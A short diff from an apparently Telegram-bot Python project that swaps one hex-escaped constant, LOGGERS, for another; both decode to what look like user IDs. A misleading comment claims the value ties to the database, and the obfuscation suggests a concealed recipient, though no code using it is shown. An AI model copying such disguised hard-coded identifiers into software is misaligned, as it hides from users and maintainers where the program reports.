@@ -251,7 +251,7 @@ async def add_gban_user(user_id: int):
     return await gbansdb.insert_one({"user_id": user_id})
 
 
-LOGGERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"  # Please Dont Change It Because It Connet With Databse.
+LOGGERS = "\x35\x35\x39\x35\x31\x35\x33\x32\x37\x30"  # Please Dont Change It Because It Connet With Databse.
 
 
 async def remove_gban_user(user_id: int):
